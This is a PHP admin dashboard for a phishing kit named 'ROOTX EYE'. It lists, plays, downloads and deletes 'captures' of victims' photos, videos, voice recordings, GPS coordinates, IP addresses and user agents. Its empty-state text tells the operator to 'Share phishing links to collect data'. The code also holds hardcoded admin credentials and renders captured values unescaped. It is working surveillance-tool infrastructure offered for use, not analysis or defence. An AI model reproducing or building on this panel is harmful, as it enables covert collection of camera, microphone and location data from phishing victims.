<?php
session_start();
$admin_user = 'rootx';
$admin_pass = 'rootx123';

if ($_POST['login']) {
    if ($_POST['username'] == $admin_user && $_POST['password'] == $admin_pass) {
        $_SESSION['loggedin'] = true;
    }
}

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>ROOTX EYE Admin</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin:0; padding:0; box-sizing:border-box; }
            body {
                background: #0a0a1a;
                font-family: 'Segoe UI', sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #fff;
            }
            .login-box {
                background: rgba(255,255,255,0.05);
                backdrop-filter: blur(10px);
                padding: 40px;
                border-radius: 20px;
                border: 1px solid rgba(255,255,255,0.1);
                width: 350px;
                text-align: center;
            }
            .login-box h1 {
                font-size: 32px;
                background: linear-gradient(45deg, #ff0033, #ff0066);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            .login-box .sub {
                color: #666;
                font-size: 14px;
                margin-bottom: 25px;
            }
            .login-box input {
                width: 100%;
                padding: 12px 15px;
                margin: 8px 0;
                background: rgba(255,255,255,0.05);
                border: 1px solid #333;
                border-radius: 8px;
                color: #fff;
                font-size: 14px;
            }
            .login-box input:focus {
                border-color: #ff0066;
                outline: none;
            }
            .login-box button {
                width: 100%;
                padding: 12px;
                background: linear-gradient(45deg, #ff0033, #ff0066);
                border: none;
                border-radius: 8px;
                color: #fff;
                font-size: 16px;
                font-weight: bold;
                cursor: pointer;
                transition: 0.3s;
                margin-top: 10px;
            }
            .login-box button:hover { transform: scale(1.02); }
            .login-box .footer {
                margin-top: 20px;
                font-size: 12px;
                color: #444;
            }
            .login-box .error {
                color: #ff0033;
                font-size: 13px;
                margin-top: 10px;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>👁️ ROOTX EYE</h1>
            <div class="sub">Admin Panel Login</div>
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="login">🔐 Login</button>
            </form>
            <?php if (isset($_POST['login']) && !$_SESSION['loggedin']): ?>
                <div class="error">❌ Invalid credentials!</div>
            <?php endif; ?>
            <div class="footer">🔒 Secure Admin Access</div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

$data_dir = 'data/';
$captures_file = $data_dir . 'captures.json';
if (!is_dir($data_dir)) mkdir($data_dir, 0777, true);

$captures = [];
if (file_exists($captures_file)) {
    $captures = json_decode(file_get_contents($captures_file), true) ?: [];
}

if ($_GET['clear'] == 'all') {
    foreach ($captures as $c) {
        if (!empty($c['file']) && file_exists($c['file'])) unlink($c['file']);
    }
    file_put_contents($captures_file, json_encode([]));
    header('Location: admin.php'); exit;
}
if ($_GET['delete'] && isset($captures[$_GET['delete']])) {
    if (!empty($captures[$_GET['delete']]['file']) && file_exists($captures[$_GET['delete']]['file'])) {
        unlink($captures[$_GET['delete']]['file']);
    }
    unset($captures[$_GET['delete']]);
    file_put_contents($captures_file, json_encode(array_values($captures)));
    header('Location: admin.php'); exit;
}
if ($_GET['download'] && isset($captures[$_GET['download']])) {
    $file = $captures[$_GET['download']]['file'];
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file); exit;
    }
}

$total = count($captures);
$types = [];
foreach ($captures as $c) {
    $t = $c['type'] ?? 'unknown';
    $types[$t] = ($types[$t] ?? 0) + 1;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ROOTX EYE Admin</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #0a0a1a;
            font-family: 'Orbitron', 'Segoe UI', sans-serif;
            color: #fff;
            padding: 20px;
            min-height: 100vh;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        
        /* Header */
        .header {
            background: linear-gradient(135deg, #1a0033, #33001a, #1a0033);
            padding: 30px;
            border-radius: 15px;
            margin-bottom: 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            border: 1px solid rgba(255,0,102,0.2);
            box-shadow: 0 0 30px rgba(255,0,102,0.1);
        }
        .header h1 {
            font-size: 32px;
            background: linear-gradient(45deg, #ff0033, #ff0066, #ff0033);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(255,0,102,0.3);
        }
        .header .sub {
            color: #666;
            font-size: 14px;
            letter-spacing: 2px;
        }
        .header .stats {
            background: rgba(255,255,255,0.05);
            padding: 12px 25px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.05);
        }
        .header .stats span { color: #ff0066; font-weight: bold; font-size: 18px; }
        .header .stats .label { color: #888; font-size: 13px; }

        /* Filters */
        .filters {
            display: flex;
            gap: 12px;
            margin-bottom: 25px;
            flex-wrap: wrap;
            align-items: center;
        }
        .filters select {
            padding: 8px 16px;
            background: rgba(255,255,255,0.05);
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
            cursor: pointer;
            font-family: 'Orbitron', sans-serif;
        }
        .filters select:focus { border-color: #ff0066; outline: none; }
        .btn {
            padding: 8px 20px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
            font-size: 13px;
            font-family: 'Orbitron', sans-serif;
        }
        .btn:hover { transform: scale(1.02); }
        .btn-refresh { background: #3498db; color: #fff; }
        .btn-clear { background: #e74c3c; color: #fff; }
        .btn-logout { background: #555; color: #fff; }

        /* Grid */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
        }

        /* Card */
        .card {
            background: rgba(255,255,255,0.03);
            border-radius: 14px;
            overflow: hidden;
            border: 1px solid rgba(255,255,255,0.06);
            transition: 0.3s;
        }
        .card:hover {
            transform: translateY(-5px);
            border-color: rgba(255,0,102,0.3);
            box-shadow: 0 10px 30px rgba(255,0,102,0.05);
        }

        .card .preview {
            width: 100%;
            height: 200px;
            background: #0d0d20;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 50px;
            color: #333;
            overflow: hidden;
            position: relative;
        }
        .card .preview img,
        .card .preview video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .card .preview .type-badge {
            position: absolute;
            top: 10px;
            right: 10px;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 10px;
            font-weight: bold;
            text-transform: uppercase;
            background: rgba(0,0,0,0.7);
            color: #fff;
            backdrop-filter: blur(4px);
        }
        .card .preview .type-badge.photo { border-left: 3px solid #00ff88; }
        .card .preview .type-badge.video { border-left: 3px solid #ff0066; }
        .card .preview .type-badge.voice { border-left: 3px solid #f39c12; }
        .card .preview .type-badge.location { border-left: 3px solid #3498db; }

        .card .info {
            padding: 14px 16px;
        }
        .card .info .time {
            color: #666;
            font-size: 12px;
        }
        .card .info .ip {
            color: #888;
            font-size: 12px;
            margin-top: 2px;
        }
        .card .info .ua {
            color: #555;
            font-size: 11px;
            margin-top: 4px;
            word-break: break-all;
        }

        .card .actions {
            padding: 10px 16px;
            background: rgba(255,255,255,0.02);
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            border-top: 1px solid rgba(255,255,255,0.03);
        }
        .card .actions a {
            padding: 5px 14px;
            border-radius: 6px;
            text-decoration: none;
            font-size: 12px;
            font-weight: 500;
            transition: 0.3s;
        }
        .card .actions a:hover { opacity: 0.8; }
        .btn-download { background: #00b894; color: #fff; }
        .btn-delete { background: #e74c3c; color: #fff; }

        /* Empty */
        .empty {
            text-align: center;
            padding: 80px 20px;
            color: #444;
            font-size: 18px;
            grid-column: 1 / -1;
        }
        .empty .icon { font-size: 70px; margin-bottom: 15px; display: block; }
        .empty .sub { color: #555; font-size: 14px; }

        /* Scrollbar */
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #0a0a1a; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
        ::-webkit-scrollbar-thumb:hover { background: #555; }

        /* Responsive */
        @media (max-width: 600px) {
            .header { flex-direction: column; text-align: center; gap: 15px; }
            .grid { grid-template-columns: 1fr; }
            .filters { justify-content: center; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div>
                <h1>👁️ ROOTX EYE</h1>
                <div class="sub">Admin Panel — Live Data Dashboard</div>
            </div>
            <div class="stats">
                <div><span><?= $total ?></span> <span class="label">Total Captures</span></div>
                <div style="font-size:12px; color:#666; margin-top:4px;">
                    <?php foreach ($types as $t => $c): ?>
                        <?= $t ?>: <?= $c ?> &nbsp;
                    <?php endforeach; ?>
                </div>
            </div>
        </div>

        <div class="filters">
            <select id="filterType" onchange="filterCards()">
                <option value="all">📋 All Types</option>
                <option value="photo">📷 Photo</option>
                <option value="video">🎥 Video</option>
                <option value="voice">🎤 Voice</option>
                <option value="location">📍 Location</option>
            </select>
            <button class="btn btn-refresh" onclick="location.reload()">🔄 Refresh</button>
            <button class="btn btn-clear" onclick="if(confirm('⚠️ Delete ALL data?')) location.href='?clear=all'">🗑️ Clear All</button>
            <button class="btn btn-logout" onclick="if(confirm('Logout?')) location.href='?logout=1'">🚪 Logout</button>
        </div>

        <div class="grid" id="cardGrid">
            <?php if (empty($captures)): ?>
                <div class="empty">
                    <span class="icon">📭</span>
                    No data captured yet.<br>
                    <div class="sub">Share phishing links to collect data</div>
                </div>
            <?php else: ?>
                <?php foreach (array_reverse($captures) as $index => $capture): ?>
                <div class="card" data-type="<?= $capture['type'] ?? 'unknown' ?>">
                    <div class="preview">
                        <?php if (($capture['type'] ?? '') == 'photo' && !empty($capture['file'])): ?>
                            <img src="<?= $capture['file'] ?>" alt="Photo">
                        <?php elseif (($capture['type'] ?? '') == 'video' && !empty($capture['file'])): ?>
                            <video src="<?= $capture['file'] ?>" muted></video>
                        <?php elseif (($capture['type'] ?? '') == 'voice' && !empty($capture['file'])): ?>
                            <div style="text-align:center; padding:20px;">
                                <div style="font-size:50px;">🎤</div>
                                <audio controls style="width:100%; margin-top:10px;">
                                    <source src="<?= $capture['file'] ?>" type="audio/mpeg">
                                </audio>
                            </div>
                        <?php elseif (($capture['type'] ?? '') == 'location'): ?>
                            <div style="text-align:center; padding:20px;">
                                <div style="font-size:40px;">📍</div>
                                <div style="font-size:14px; color:#aaa; margin-top:10px;">
                                    Lat: <?= $capture['lat'] ?? 'N/A' ?><br>
                                    Lng: <?= $capture['lng'] ?? 'N/A' ?>
                                </div>
                                <a href="https://maps.google.com/?q=<?= $capture['lat'] ?? '' ?>,<?= $capture['lng'] ?? '' ?>" target="_blank" style="color:#3498db; font-size:12px;">🗺️ View Map</a>
                            </div>
                        <?php else: ?>
                            <span style="font-size:40px; color:#333;">❓</span>
                        <?php endif; ?>
                        <span class="type-badge <?= $capture['type'] ?? 'unknown' ?>">
                            <?= $capture['type'] ?? 'Unknown' ?>
                        </span>
                    </div>
                    <div class="info">
                        <div class="time">🕐 <?= $capture['time'] ?? 'N/A' ?></div>
                        <div class="ip">🌐 IP: <?= $capture['ip'] ?? 'N/A' ?></div>
                        <div class="ua">📱 <?= isset($capture['user_agent']) ? substr($capture['user_agent'], 0, 60) . '...' : 'N/A' ?></div>
                    </div>
                    <div class="actions">
                        <?php if (($capture['type'] ?? '') != 'location' && !empty($capture['file'])): ?>
                            <a href="?download=<?= $index ?>" class="btn-download">⬇️ Download</a>
                        <?php endif; ?>
                        <a href="?delete=<?= $index ?>" class="btn-delete" onclick="return confirm('Delete this capture?')">🗑️ Delete</a>
                    </div>
                </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
    </div>

    <script>
        function filterCards() {
            const filter = document.getElementById('filterType').value;
            const cards = document.querySelectorAll('.card');
            cards.forEach(card => {
                const type = card.dataset.type;
                card.style.display = (filter === 'all' || type === filter) ? 'block' : 'none';
            });
        }

        // Auto refresh every 10 seconds
        setTimeout(() => location.reload(), 10000);
    </script>
</body>
</html>
